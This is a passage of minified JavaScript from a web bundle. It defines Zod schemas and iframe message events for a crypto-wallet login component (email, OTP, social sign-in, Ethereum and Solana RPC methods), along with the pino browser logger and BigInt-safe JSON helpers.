Rk},ZodParsedType:ct,getParsedType:lp,ZodType:cn,ZodString:Ou,ZodNumber:Ip,ZodBigInt:Rp,ZodBoolean:IE,ZodDate:ng,ZodSymbol:lx,ZodUndefined:RE,ZodNull:PE,ZodAny:b1,ZodUnknown:Gm,ZodNever:If,ZodVoid:dx,ZodArray:ju,ZodObject:Wr,ZodUnion:NE,ZodDiscriminatedUnion:UI,ZodIntersection:OE,ZodTuple:Kl,ZodRecord:kE,ZodMap:fx,ZodSet:rg,ZodFunction:Jb,ZodLazy:DE,ZodLiteral:BE,ZodEnum:Pp,ZodNativeEnum:jE,ZodPromise:w1,ZodEffects:Uu,ZodTransformer:Uu,ZodOptional:Ef,ZodNullable:ig,ZodDefault:ME,ZodCatch:hx,ZodNaN:px,BRAND:Nme,ZodBranded:Tre,ZodPipeline:V_,ZodReadonly:mx,custom:xre,Schema:cn,ZodSchema:cn,late:Ome,get ZodFirstPartyTypeKind(){return $t},coerce:hge,any:Fme,array:qme,bigint:Bme,boolean:Pre,date:jme,discriminatedUnion:Kme,effect:oH,enum:rge,function:ege,instanceof:kme,intersection:Zme,lazy:tge,literal:nge,map:Jme,nan:Dme,nativeEnum:ige,never:Hme,null:Lme,nullable:age,number:Rre,object:Vme,oboolean:fge,onumber:dge,optional:oge,ostring:lge,pipeline:uge,preprocess:cge,promise:sge,record:Qme,set:Xme,strictObject:Wme,string:Ire,symbol:Mme,transformer:oH,tuple:Yme,undefined:Ume,union:Gme,unknown:$me,void:zme,NEVER:pge,ZodIssueCode:Ze,quotelessJson:yme,ZodError:Bu});const ni=ee.object({message:ee.string()});function ft(t){return ee.literal(bt[t])}const LI=ee.object({serializedMessage:ee.string().optional(),accountAddress:ee.string(),chainId:ee.string(),notBefore:ee.string().optional(),domain:ee.string(),uri:ee.string(),version:ee.string(),nonce:ee.string(),statement:ee.string().optional(),resources:ee.array(ee.string()).optional(),requestId:ee.string().optional(),issuedAt:ee.string().optional(),expirationTime:ee.string().optional()});ee.object({accessList:ee.array(ee.string()),blockHash:ee.string().nullable(),blockNumber:ee.string().nullable(),chainId:ee.string().or(ee.number()),from:ee.string(),gas:ee.string(),hash:ee.string(),input:ee.string().nullable(),maxFeePerGas:ee.string(),maxPriorityFeePerGas:ee.string(),nonce:ee.string(),r:ee.string(),s:ee.string(),to:ee.string(),transactionIndex:ee.string().nullable(),type:ee.string(),v:ee.string(),value:ee.string()});const mge=ee.object({chainId:ee.string().or(ee.number()),rpcUrl:ee.optional(ee.string())}),gge=ee.object({email:ee.string().email()}),yge=ee.object({otp:ee.string()}),bge=ee.object({uri:ee.string(),preferredAccountType:ee.optional(ee.string()),chainId:ee.optional(ee.string().or(ee.number())),siwxMessage:ee.optional(LI),rpcUrl:ee.optional(ee.string())}),wge=ee.object({chainId:ee.optional(ee.string().or(ee.number())),preferredAccountType:ee.optional(ee.string()),socialUri:ee.optional(ee.string()),siwxMessage:ee.optional(LI),rpcUrl:ee.optional(ee.string())}),vge=ee.object({provider:ee.enum(["google","github","apple","facebook","x","discord"])}),Ege=ee.object({email:ee.string().email()}),_ge=ee.object({otp:ee.string()}),Age=ee.object({otp:ee.string()}),Cge=ee.object({themeMode:ee.optional(ee.enum(["light","dark"])),themeVariables:ee.optional(ee.record(ee.string(),ee.string().or(ee.number()))),w3mThemeVariables:ee.optional(ee.record(ee.string(),ee.string()))}),Sge=ee.object({metadata:ee.object({name:ee.string(),description:ee.string(),url:ee.string(),icons:ee.array(ee.string())}).optional(),sdkVersion:ee.string().optional(),sdkType:ee.string().optional(),projectId:ee.string()}),Tge=ee.object({type:ee.string()}),xge=ee.object({action:ee.enum(["VERIFY_DEVICE","VERIFY_OTP","CONNECT"])}),Ige=ee.object({url:ee.string()}),Rge=ee.object({userName:ee.string()}),Pge=ee.object({email:ee.string().optional().nullable(),address:ee.string(),chainId:ee.string().or(ee.number()),accounts:ee.array(ee.object({address:ee.string(),type:ee.enum([Xn.ACCOUNT_TYPES.EOA,Xn.ACCOUNT_TYPES.SMART_ACCOUNT])})).optional(),userName:ee.string().optional().nullable(),preferredAccountType:ee.optional(ee.string()),signature:ee.string().optional(),message:ee.string().optional(),siwxMessage:ee.optional(LI)}),Nge=ee.object({action:ee.enum(["VERIFY_PRIMARY_OTP","VERIFY_SECONDARY_OTP"])}),Oge=ee.object({email:ee.string().email().optional().nullable(),address:ee.string(),chainId:ee.string().or(ee.number()),smartAccountDeployed:ee.optional(ee.boolean()),accounts:ee.array(ee.object({address:ee.string(),type:ee.enum([Xn.ACCOUNT_TYPES.EOA,Xn.ACCOUNT_TYPES.SMART_ACCOUNT])})).optional(),preferredAccountType:ee.optional(ee.string()),signature:ee.string().optional(),message:ee.string().optional(),siwxMessage:ee.optional(LI)}),kge=ee.object({uri:ee.string()}),Dge=ee.object({isConnected:ee.boolean()}),Bge=ee.object({chainId:ee.string().or(ee.number())}),jge=ee.object({chainId:ee.string().or(ee.number())}),Mge=ee.object({newEmail:ee.string().email()}),Uge=ee.object({smartAccountEnabledNetworks:ee.array(ee.number())});ee.object({address:ee.string(),isDeployed:ee.boolean()});const Lge=ee.object({version:ee.string().optional()}),Fge=ee.object({type:ee.string(),address:ee.string()}),$ge=ee.any(),Hge=ee.object({method:ee.literal("eth_accounts")}),zge=ee.object({method:ee.literal("eth_blockNumber")}),qge=ee.object({method:ee.literal("eth_call"),params:ee.array(ee.any())}),Vge=ee.object({method:ee.literal("eth_chainId")}),Wge=ee.object({method:ee.literal("eth_estimateGas"),params:ee.array(ee.any())}),Gge=ee.object({method:ee.literal("eth_feeHistory"),params:ee.array(ee.any())}),Kge=ee.object({method:ee.literal("eth_gasPrice")}),Zge=ee.object({method:ee.literal("eth_getAccount"),params:ee.array(ee.any())}),Yge=ee.object({method:ee.literal("eth_getBalance"),params:ee.array(ee.any())}),Qge=ee.object({method:ee.literal("eth_getBlockByHash"),params:ee.array(ee.any())}),Jge=ee.object({method:ee.literal("eth_getBlockByNumber"),params:ee.array(ee.any())}),Xge=ee.object({method:ee.literal("eth_getBlockReceipts"),params:ee.array(ee.any())}),eye=ee.object({method:ee.literal("eth_getBlockTransactionCountByHash"),params:ee.array(ee.any())}),tye=ee.object({method:ee.literal("eth_getBlockTransactionCountByNumber"),params:ee.array(ee.any())}),nye=ee.object({method:ee.literal("eth_getCode"),params:ee.array(ee.any())}),rye=ee.object({method:ee.literal("eth_getFilterChanges"),params:ee.array(ee.any())}),iye=ee.object({method:ee.literal("eth_getFilterLogs"),params:ee.array(ee.any())}),sye=ee.object({method:ee.literal("eth_getLogs"),params:ee.array(ee.any())}),oye=ee.object({method:ee.literal("eth_getProof"),params:ee.array(ee.any())}),aye=ee.object({method:ee.literal("eth_getStorageAt"),params:ee.array(ee.any())}),cye=ee.object({method:ee.literal("eth_getTransactionByBlockHashAndIndex"),params:ee.array(ee.any())}),uye=ee.object({method:ee.literal("eth_getTransactionByBlockNumberAndIndex"),params:ee.array(ee.any())}),lye=ee.object({method:ee.literal("eth_getTransactionByHash"),params:ee.array(ee.any())}),dye=ee.object({method:ee.literal("eth_getTransactionCount"),params:ee.array(ee.any())}),fye=ee.object({method:ee.literal("eth_getTransactionReceipt"),params:ee.array(ee.any())}),hye=ee.object({method:ee.literal("eth_getUncleCountByBlockHash"),params:ee.array(ee.any())}),pye=ee.object({method:ee.literal("eth_getUncleCountByBlockNumber"),params:ee.array(ee.any())}),mye=ee.object({method:ee.literal("eth_maxPriorityFeePerGas")}),gye=ee.object({method:ee.literal("eth_newBlockFilter")}),yye=ee.object({method:ee.literal("eth_newFilter"),params:ee.array(ee.any())}),bye=ee.object({method:ee.literal("eth_newPendingTransactionFilter")}),wye=ee.object({method:ee.literal("eth_sendRawTransaction"),params:ee.array(ee.any())}),vye=ee.object({method:ee.literal("eth_syncing"),params:ee.array(ee.any())}),Eye=ee.object({method:ee.literal("eth_uninstallFilter"),params:ee.array(ee.any())}),aH=ee.object({method:ee.literal("personal_sign"),params:ee.array(ee.any())}),_ye=ee.object({method:ee.literal("eth_signTypedData_v4"),params:ee.array(ee.any())}),Aye=ee.object({method:ee.literal("eth_sendTransaction"),params:ee.array(ee.any())}),Cye=ee.object({method:ee.literal("solana_signMessage"),params:ee.object({message:ee.string(),pubkey:ee.string()})}),Sye=ee.object({method:ee.literal("solana_signTransaction"),params:ee.object({transaction:ee.string()})}),Tye=ee.object({method:ee.literal("solana_signAllTransactions"),params:ee.object({transactions:ee.array(ee.string())})}),xye=ee.object({method:ee.literal("solana_signAndSendTransaction"),params:ee.object({transaction:ee.string(),options:ee.object({skipPreflight:ee.boolean().optional(),preflightCommitment:ee.enum(["processed","confirmed","finalized","recent","single","singleGossip","root","max"]).optional(),maxRetries:ee.number().optional(),minContextSlot:ee.number().optional()}).optional()})}),Iye=ee.object({method:ee.literal("wallet_sendCalls"),params:ee.array(ee.object({chainId:ee.string().or(ee.number()).optional(),from:ee.string().optional(),version:ee.string().optional(),capabilities:ee.any().optional(),calls:ee.array(ee.object({to:ee.string().startsWith("0x"),data:ee.string().startsWith("0x").optional(),value:ee.string().optional()}))}))}),Rye=ee.object({method:ee.literal("wallet_getCallsStatus"),params:ee.array(ee.string())}),Pye=ee.object({method:ee.literal("wallet_getCapabilities"),params:ee.array(ee.string().or(ee.number()).optional()).optional()}),Nye=ee.object({method:ee.literal("wallet_grantPermissions"),params:ee.array(ee.any())}),Oye=ee.object({method:ee.literal("wallet_revokePermissions"),params:ee.any()}),kye=ee.object({method:ee.literal("wallet_getAssets"),params:ee.any()}),cH=ee.object({token:ee.string()}),ht=ee.object({id:ee.string().optional()}),TN={appEvent:ht.extend({type:ft("APP_SWITCH_NETWORK"),payload:mge}).or(ht.extend({type:ft("APP_CONNECT_EMAIL"),payload:gge})).or(ht.extend({type:ft("APP_CONNECT_DEVICE")})).or(ht.extend({type:ft("APP_CONNECT_OTP"),payload:yge})).or(ht.extend({type:ft("APP_CONNECT_SOCIAL"),payload:bge})).or(ht.extend({type:ft("APP_GET_FARCASTER_URI")})).or(ht.extend({type:ft("APP_CONNECT_FARCASTER")})).or(ht.extend({type:ft("APP_GET_USER"),payload:ee.optional(wge)})).or(ht.extend({type:ft("APP_GET_SOCIAL_REDIRECT_URI"),payload:vge})).or(ht.extend({type:ft("APP_SIGN_OUT")})).or(ht.extend({type:ft("APP_IS_CONNECTED"),payload:ee.optional(cH)})).or(ht.extend({type:ft("APP_GET_CHAIN_ID")})).or(ht.extend({type:ft("APP_GET_SMART_ACCOUNT_ENABLED_NETWORKS")})).or(ht.extend({type:ft("APP_INIT_SMART_ACCOUNT")})).or(ht.extend({type:ft("APP_SET_PREFERRED_ACCOUNT"),payload:Tge})).or(ht.extend({type:ft("APP_RPC_REQUEST"),payload:aH.or(kye).or(Hge).or(zge).or(qge).or(Vge).or(Wge).or(Gge).or(Kge).or(Zge).or(Yge).or(Qge).or(Jge).or(Xge).or(eye).or(tye).or(nye).or(rye).or(iye).or(sye).or(oye).or(aye).or(cye).or(uye).or(lye).or(dye).or(fye).or(hye).or(pye).or(mye).or(gye).or(yye).or(bye).or(wye).or(vye).or(Eye).or(aH).or(_ye).or(Aye).or(Cye).or(Sye).or(Tye).or(xye).or(Rye).or(Iye).or(Pye).or(Nye).or(Oye).and(ee.object({chainId:ee.string().or(ee.number()).optional(),chainNamespace:ee.enum(["eip155","solana","polkadot","bip122","cosmos"]).optional(),rpcUrl:ee.string().optional()}))})).or(ht.extend({type:ft("APP_UPDATE_EMAIL"),payload:Ege})).or(ht.extend({type:ft("APP_UPDATE_EMAIL_PRIMARY_OTP"),payload:_ge})).or(ht.extend({type:ft("APP_UPDATE_EMAIL_SECONDARY_OTP"),payload:Age})).or(ht.extend({type:ft("APP_SYNC_THEME"),payload:Cge})).or(ht.extend({type:ft("APP_SYNC_DAPP_DATA"),payload:Sge})).or(ht.extend({type:ft("APP_RELOAD")})).or(ht.extend({type:ft("APP_RPC_ABORT")})),frameEvent:ht.extend({type:ft("FRAME_SWITCH_NETWORK_ERROR"),payload:ni}).or(ht.extend({type:ft("FRAME_SWITCH_NETWORK_SUCCESS"),payload:jge})).or(ht.extend({type:ft("FRAME_CONNECT_EMAIL_SUCCESS"),payload:xge})).or(ht.extend({type:ft("FRAME_CONNECT_EMAIL_ERROR"),payload:ni})).or(ht.extend({type:ft("FRAME_GET_FARCASTER_URI_SUCCESS"),payload:Ige})).or(ht.extend({type:ft("FRAME_GET_FARCASTER_URI_ERROR"),payload:ni})).or(ht.extend({type:ft("FRAME_CONNECT_FARCASTER_SUCCESS"),payload:Rge})).or(ht.extend({type:ft("FRAME_CONNECT_FARCASTER_ERROR"),payload:ni})).or(ht.extend({type:ft("FRAME_CONNECT_OTP_ERROR"),payload:ni})).or(ht.extend({type:ft("FRAME_CONNECT_OTP_SUCCESS")})).or(ht.extend({type:ft("FRAME_CONNECT_DEVICE_ERROR"),payload:ni})).or(ht.extend({type:ft("FRAME_CONNECT_DEVICE_SUCCESS")})).or(ht.extend({type:ft("FRAME_CONNECT_SOCIAL_SUCCESS"),payload:Pge})).or(ht.extend({type:ft("FRAME_CONNECT_SOCIAL_ERROR"),payload:ni})).or(ht.extend({type:ft("FRAME_GET_USER_ERROR"),payload:ni})).or(ht.extend({type:ft("FRAME_GET_USER_SUCCESS"),payload:Oge})).or(ht.extend({type:ft("FRAME_GET_SOCIAL_REDIRECT_URI_ERROR"),payload:ni})).or(ht.extend({type:ft("FRAME_GET_SOCIAL_REDIRECT_URI_SUCCESS"),payload:kge})).or(ht.extend({type:ft("FRAME_SIGN_OUT_ERROR"),payload:ni})).or(ht.extend({type:ft("FRAME_SIGN_OUT_SUCCESS")})).or(ht.extend({type:ft("FRAME_IS_CONNECTED_ERROR"),payload:ni})).or(ht.extend({type:ft("FRAME_IS_CONNECTED_SUCCESS"),payload:Dge})).or(ht.extend({type:ft("FRAME_GET_CHAIN_ID_ERROR"),payload:ni})).or(ht.extend({type:ft("FRAME_GET_CHAIN_ID_SUCCESS"),payload:Bge})).or(ht.extend({type:ft("FRAME_RPC_REQUEST_ERROR"),payload:ni})).or(ht.extend({type:ft("FRAME_RPC_REQUEST_SUCCESS"),payload:$ge})).or(ht.extend({type:ft("FRAME_SESSION_UPDATE"),payload:cH})).or(ht.extend({type:ft("FRAME_UPDATE_EMAIL_ERROR"),payload:ni})).or(ht.extend({type:ft("FRAME_UPDATE_EMAIL_SUCCESS"),payload:Nge})).or(ht.extend({type:ft("FRAME_UPDATE_EMAIL_PRIMARY_OTP_ERROR"),payload:ni})).or(ht.extend({type:ft("FRAME_UPDATE_EMAIL_PRIMARY_OTP_SUCCESS")})).or(ht.extend({type:ft("FRAME_UPDATE_EMAIL_SECONDARY_OTP_ERROR"),payload:ni})).or(ht.extend({type:ft("FRAME_UPDATE_EMAIL_SECONDARY_OTP_SUCCESS"),payload:Mge})).or(ht.extend({type:ft("FRAME_SYNC_THEME_ERROR"),payload:ni})).or(ht.extend({type:ft("FRAME_SYNC_THEME_SUCCESS")})).or(ht.extend({type:ft("FRAME_SYNC_DAPP_DATA_ERROR"),payload:ni})).or(ht.extend({type:ft("FRAME_SYNC_DAPP_DATA_SUCCESS")})).or(ht.extend({type:ft("FRAME_GET_SMART_ACCOUNT_ENABLED_NETWORKS_SUCCESS"),payload:Uge})).or(ht.extend({type:ft("FRAME_GET_SMART_ACCOUNT_ENABLED_NETWORKS_ERROR"),payload:ni})).or(ht.extend({type:ft("FRAME_INIT_SMART_ACCOUNT_ERROR"),payload:ni})).or(ht.extend({type:ft("FRAME_SET_PREFERRED_ACCOUNT_SUCCESS"),payload:Fge})).or(ht.extend({type:ft("FRAME_SET_PREFERRED_ACCOUNT_ERROR"),payload:ni})).or(ht.extend({type:ft("FRAME_READY"),payload:Lge})).or(ht.extend({type:ft("FRAME_RELOAD_ERROR"),payload:ni})).or(ht.extend({type:ft("FRAME_RELOAD_SUCCESS")}))};function xN(t,e={}){return typeof e?.type=="string"&&e?.type?.includes(t)}function Dye({projectId:t,chainId:e,enableLogger:n,rpcUrl:r=ge.BLOCKCHAIN_API_RPC_URL,enableCloudAuthAccount:i=!1}){const s=new URL(pme);s.searchParams.set("projectId",t),s.searchParams.set("chainId",String(e)),s.searchParams.set("version",gme),s.searchParams.set("enableLogger",String(n)),s.searchParams.set("rpcUrl",r);const o=$i.get("dapp_smart_account_version");return o&&(o==="v6"||o==="v7")&&(console.warn(">> AppKit - Forcing smart account version",o),s.searchParams.set("smartAccountVersion",o)),i&&s.searchParams.set("enableCloudAuthAccount","true"),s.toString()}class Bye{constructor({projectId:e,isAppClient:n=!1,chainId:r="eip155:1",enableLogger:i=!0,enableCloudAuthAccount:s=!1,rpcUrl:o=ge.BLOCKCHAIN_API_RPC_URL}){if(this.iframe=null,this.iframeIsReady=!1,this.initFrame=()=>{const a=document.getElementById("w3m-iframe");this.iframe&&!a&&document.body.appendChild(this.iframe)},this.events={registerFrameEventHandler:(a,c,l)=>{function f({data:h}){if(!xN(bt.FRAME_EVENT_KEY,h))return;const m=TN.frameEvent.safeParse(h);if(!m.success){console.warn("W3mFrame: invalid frame event",m.error.message);return}m.data?.id===a&&(c(m.data),window.removeEventListener("message",f))}Wa.isClient&&(window.addEventListener("message",f),l.addEventListener("abort",()=>{window.removeEventListener("message",f)}))},onFrameEvent:a=>{Wa.isClient&&window.addEventListener("message",({data:c})=>{if(!xN(bt.FRAME_EVENT_KEY,c))return;const l=TN.frameEvent.safeParse(c);l.success?a(l.data):console.warn("W3mFrame: invalid frame event",l.error.message)})},onAppEvent:a=>{Wa.isClient&&window.addEventListener("message",({data:c})=>{if(!xN(bt.APP_EVENT_KEY,c))return;const l=TN.appEvent.safeParse(c);l.success||console.warn("W3mFrame: invalid app event",l.error.message),a(c)})},postAppEvent:a=>{if(Wa.isClient){if(!this.iframe?.contentWindow)throw new Error("W3mFrame: iframe is not set");this.iframe.contentWindow.postMessage(a,"*")}},postFrameEvent:a=>{if(Wa.isClient){if(!parent)throw new Error("W3mFrame: parent is not set");parent.postMessage(a,"*")}}},this.projectId=e,this.frameLoadPromise=new Promise((a,c)=>{this.frameLoadPromiseResolver={resolve:a,reject:c}}),this.rpcUrl=o,n&&(this.frameLoadPromise=new Promise((a,c)=>{this.frameLoadPromiseResolver={resolve:a,reject:c}}),Wa.isClient)){const a=document.createElement("iframe");a.id="w3m-iframe",a.src=Dye({projectId:e,chainId:r,enableLogger:i,rpcUrl:this.rpcUrl,enableCloudAuthAccount:s}),a.name="w3m-secure-iframe",a.style.position="fixed",a.style.zIndex="999999",a.style.display="none",a.style.border="none",a.style.animationDelay="0s, 50ms",a.style.borderBottomLeftRadius="clamp(0px, var(--apkt-borderRadius-8), 44px)",a.style.borderBottomRightRadius="clamp(0px, var(--apkt-borderRadius-8), 44px)",this.iframe=a,this.iframe.onerror=()=>{this.frameLoadPromiseResolver?.reject("Unable to load email login dependency")},this.events.onFrameEvent(c=>{c.type==="@w3m-frame/READY"&&(this.iframeIsReady=!0,this.frameLoadPromiseResolver?.resolve(void 0))})}}get networks(){const e=["eip155:1","eip155:5","eip155:11155111","eip155:10","eip155:420","eip155:42161","eip155:421613","eip155:137","eip155:80001","eip155:42220","eip155:1313161554","eip155:1313161555","eip155:56","eip155:97","eip155:43114","eip155:43113","eip155:324","eip155:280","eip155:100","eip155:8453","eip155:84531","eip155:84532","eip155:7777777","eip155:999","solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp","solana:4uhcVJyU9pJkvQyS88uRDiswHXSCkY3z","solana:EtWTRABZaYq6iMfeYKouRu166VU2xqa1"].map(n=>({[n]:{rpcUrl:`${this.rpcUrl}/v1/?chainId=${n}&projectId=${this.projectId}`,chainId:n}}));return Object.assign({},...e)}}var gv={exports:{}},IN,uH;function jye(){if(uH)return IN;uH=1;function t(n){try{return JSON.stringify(n)}catch{return'"[Circular]"'}}IN=e;function e(n,r,i){var s=i&&i.stringify||t,o=1;if(typeof n=="object"&&n!==null){var a=r.length+o;if(a===1)return n;var c=new Array(a);c[0]=s(n);for(var l=1;l<a;l++)c[l]=s(r[l]);return c.join(" ")}if(typeof n!="string")return n;var f=r.length;if(f===0)return n;for(var h="",m=1-o,b=-1,w=n&&n.length||0,y=0;y<w;){if(n.charCodeAt(y)===37&&y+1<w){switch(b=b>-1?b:0,n.charCodeAt(y+1)){case 100:case 102:if(m>=f||r[m]==null)break;b<y&&(h+=n.slice(b,y)),h+=Number(r[m]),b=y+2,y++;break;case 105:if(m>=f||r[m]==null)break;b<y&&(h+=n.slice(b,y)),h+=Math.floor(Number(r[m])),b=y+2,y++;break;case 79:case 111:case 106:if(m>=f||r[m]===void 0)break;b<y&&(h+=n.slice(b,y));var E=typeof r[m];if(E==="string"){h+="'"+r[m]+"'",b=y+2,y++;break}if(E==="function"){h+=r[m].name||"<anonymous>",b=y+2,y++;break}h+=s(r[m]),b=y+2,y++;break;case 115:if(m>=f)break;b<y&&(h+=n.slice(b,y)),h+=String(r[m]),b=y+2,y++;break;case 37:b<y&&(h+=n.slice(b,y)),h+="%",b=y+2,y++,m--;break}++m}++y}return b===-1?n:(b<w&&(h+=n.slice(b)),h)}return IN}var lH;function Mye(){if(lH)return gv.exports;lH=1;const t=jye();gv.exports=f;const e=q().console||{},n={mapHttpRequest:_,mapHttpResponse:_,wrapRequestSerializer:I,wrapResponseSerializer:I,wrapErrorSerializer:I,req:_,res:_,err:k,errWithCause:k};function r(P,C){return P==="silent"?1/0:C.levels.values[P]}const i=Symbol("pino.logFuncs"),s=Symbol("pino.hierarchy"),o={error:"log",fatal:"error",warn:"error",info:"log",debug:"log",trace:"log"};function a(P,C){const j={logger:C,parent:P[s]};C[s]=j}function c(P,C,j){const z={};C.forEach($=>{z[$]=j[$]?j[$]:e[$]||e[o[$]||"log"]||T}),P[i]=z}function l(P,C){return Array.isArray(P)?P.filter(function(z){return z!=="!stdSerializers.err"}):P===!0?Object.keys(C):!1}function f(P){P=P||{},P.browser=P.browser||{};const C=P.browser.transmit;if(C&&typeof C.send!="function")throw Error("pino: transmit option must have a send function");const j=P.browser.write||e;P.browser.write&&(P.browser.asObject=!0);const z=P.serializers||{},$=l(P.browser.serialize,z);let H=P.browser.serialize;Array.isArray(P.browser.serialize)&&P.browser.serialize.indexOf("!stdSerializers.err")>-1&&(H=!1);const L=Object.keys(P.customLevels||{}),V=["error","fatal","warn","info","debug","trace"].concat(L);typeof j=="function"&&V.forEach(function(ue){j[ue]=j}),(P.enabled===!1||P.browser.disabled)&&(P.level="silent");const G=P.level||"info",Z=Object.create(j);Z.log||(Z.log=T),c(Z,V,j),a({},Z),Object.defineProperty(Z,"levelVal",{get:ne}),Object.defineProperty(Z,"level",{get:re,set:le});const J={transmit:C,serialize:$,asObject:P.browser.asObject,asObjectBindingsOnly:P.browser.asObjectBindingsOnly,formatters:P.browser.formatters,levels:V,timestamp:O(P),messageKey:P.messageKey||"msg",onChild:P.onChild||T};Z.levels=h(P),Z.level=G,Z.isLevelEnabled=function(ue){return this.levels.values[ue]?this.levels.values[ue]>=this.levels.values[this.level]:!1},Z.setMaxListeners=Z.getMaxListeners=Z.emit=Z.addListener=Z.on=Z.prependListener=Z.once=Z.prependOnceListener=Z.removeListener=Z.removeAllListeners=Z.listeners=Z.listenerCount=Z.eventNames=Z.write=Z.flush=T,Z.serializers=z,Z._serialize=$,Z._stdErrSerialize=H,Z.child=function(...ue){return oe.call(this,J,...ue)},C&&(Z._logEvent=v());function ne(){return r(this.level,this)}function re(){return this._level}function le(ue){if(ue!=="silent"&&!this.levels.values[ue])throw Error("unknown level "+ue);this._level=ue,w(this,J,Z,"error"),w(this,J,Z,"fatal"),w(this,J,Z,"warn"),w(this,J,Z,"info"),w(this,J,Z,"debug"),w(this,J,Z,"trace"),L.forEach(be=>{w(this,J,Z,be)})}function oe(ue,be,Me){if(!be)throw new Error("missing bindings for child Pino");Me=Me||{},$&&be.serializers&&(Me.serializers=be.serializers);const Te=Me.serializers;if($&&Te){var Oe=Object.assign({},z,Te),Ke=P.browser.serialize===!0?Object.keys(Oe):$;delete be.serializers,R([be],Ke,Oe,this._stdErrSerialize)}function it(At){this._childLevel=(At._childLevel|0)+1,this.bindings=be,Oe&&(this.serializers=Oe,this._serialize=Ke),C&&(this._logEvent=v([].concat(At._logEvent.bindings,be)))}it.prototype=this;const at=new it(this);return a(this,at),at.child=function(...At){return oe.call(this,ue,...At)},at.level=Me.level||this.level,ue.onChild(at),at}return Z}function h(P){const C=P.customLevels||{},j=Object.assign({},f.levels.values,C),z=Object.assign({},f.levels.labels,m(C));return{values:j,labels:z}}function m(P){const C={};return Object.keys(P).forEach(function(j){C[P[j]]=j}),C}f.levels={values:{fatal:60,error:50,warn:40,info:30,debug:20,trace:10},labels:{10:"trace",20:"debug",30:"info",40:"warn",50:"error",60:"fatal"}},f.stdSerializers=n,f.stdTimeFunctions=Object.assign({},{nullTime:B,epochTime:U,unixTime:M,isoTime:N});function b(P){const C=[];P.bindings&&C.push(P.bindings);let j=P[s];for(;j.parent;)j=j.parent,j.logger.bindings&&C.push(j.logger.bindings);return C.reverse()}function w(P,C,j,z){if(Object.defineProperty(P,z,{value:r(P.level,j)>r(z,j)?T:j[i][z],writable:!0,enumerable:!0,configurable:!0}),P[z]===T){if(!C.transmit)return;const H=C.transmit.level||P.level,L=r(H,j);if(r(z,j)<L)return}P[z]=E(P,C,j,z);const $=b(P);$.length!==0&&(P[z]=y($,P[z]))}function y(P,C){return function(){return C.apply(this,[...P,...arguments])}}function E(P,C,j,z){return(function($){return function(){const L=C.timestamp(),V=new Array(arguments.length),G=Object.getPrototypeOf&&Object.getPrototypeOf(this)===e?e:this;for(var Z=0;Z<V.length;Z++)V[Z]=arguments[Z];var J=!1;if(C.serialize&&(R(V,this._serialize,this.serializers,this._stdErrSerialize),J=!0),C.asObject||C.formatters?$.call(G,...A(this,z,V,L,C)):$.apply(G,V),C.transmit){const ne=C.transmit.level||P._level,re=r(ne,j),le=r(z,j);if(le<re)return;S(this,{ts:L,methodLevel:z,methodValue:le,transmitValue:j.levels.values[C.transmit.level||P._level],send:C.transmit.send,val:r(P._level,j)},V,J)}}})(P[i][z])}function A(P,C,j,z,$){const{level:H,log:L=ne=>ne}=$.formatters||{},V=j.slice();let G=V[0];const Z={};let J=(P._childLevel|0)+1;if(J<1&&(J=1),z&&(Z.time=z),H){const ne=H(C,P.levels.values[C]);Object.assign(Z,ne)}else Z.level=P.levels.values[C];if($.asObjectBindingsOnly){if(G!==null&&typeof G=="object")for(;J--&&typeof V[0]=="object";)Object.assign(Z,V.shift());return[L(Z),...V]}else{if(G!==null&&typeof G=="object"){for(;J--&&typeof V[0]=="object";)Object.assign(Z,V.shift());G=V.length?t(V.shift(),V):void 0}else typeof G=="string"&&(G=t(V.shift(),V));return G!==void 0&&(Z[$.messageKey]=G),[L(Z)]}}function R(P,C,j,z){for(const $ in P)if(z&&P[$]instanceof Error)P[$]=f.stdSerializers.err(P[$]);else if(typeof P[$]=="object"&&!Array.isArray(P[$])&&C)for(const H in P[$])C.indexOf(H)>-1&&H in j&&(P[$][H]=j[H](P[$][H]))}function S(P,C,j,z=!1){const $=C.send,H=C.ts,L=C.methodLevel,V=C.methodValue,G=C.val,Z=P._logEvent.bindings;z||R(j,P._serialize||Object.keys(P.serializers),P.serializers,P._stdErrSerialize===void 0?!0:P._stdErrSerialize),P._logEvent.ts=H,P._logEvent.messages=j.filter(function(J){return Z.indexOf(J)===-1}),P._logEvent.level.label=L,P._logEvent.level.value=V,$(L,P._logEvent,G),P._logEvent=v(Z)}function v(P){return{ts:0,messages:[],bindings:P||[],level:{label:"",value:0}}}function k(P){const C={type:P.constructor.name,msg:P.message,stack:P.stack};for(const j in P)C[j]===void 0&&(C[j]=P[j]);return C}function O(P){return typeof P.timestamp=="function"?P.timestamp:P.timestamp===!1?B:U}function _(){return{}}function I(P){return P}function T(){}function B(){return!1}function U(){return Date.now()}function M(){return Math.round(Date.now()/1e3)}function N(){return new Date(Date.now()).toISOString()}function q(){function P(C){return typeof C<"u"&&C}try{return typeof globalThis<"u"||Object.defineProperty(Object.prototype,"globalThis",{get:function(){return delete Object.prototype.globalThis,this.globalThis=this},configurable:!0}),globalThis}catch{return P(self)||P(window)||P(this)||{}}}return gv.exports.default=f,gv.exports.pino=f,gv.exports}var Bb=Mye();const Nre=Vf(Bb),Uye=t=>JSON.stringify(t,(e,n)=>typeof n=="bigint"?n.toString()+"n":n),Lye=t=>{const e=/([\[:])?(\d{17,}|(?:[9](?:[1-9]07199254740991|0[1-9]7199254740991|00[8-9]199254740991|007[2-9]99254740991|007199[3-9]54740991|0071992[6-9]4740991|00719925[5-9]740991|007199254[8-9]40991|0071992547[5-9]0991|00719925474[1-9]991|00719925474099[2-9])))([,\}\]])/g,n=t.replace(e,'$1"$2n"$3');return JSON.parse(n,(r,i)=>typeof i=="string"&&i.match(/^\d+n$/)?BigInt(i.substring(0,i.length-1)):i)};function sg(t){if(typeof t!="string")throw new Error(`Cannot safe json parse value of type ${typeof t}`);try{return Lye(t)}catch{return t}}function Rf(t){return typeof t=="string"?t:Uye(t)||""}const Fye={level:"info"},FI="custom_context",XD=1e3*1024;var $ye=Object.defineProperty,Hye=(t,e,n)=>e in t?$ye(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,dp=(t,e,n)=>Hye(t,typeof e!="symbol"?e+"":e,n);let zye=class{constructor(e){dp(this,"nodeValue"),dp(this,"sizeInBytes"),dp(this,"next"),this.nodeValue=e,this.sizeInBytes=new TextEncoder().encode(this.nodeValue).length,this.next=null}get value(){return this.nodeValue}get size(){return 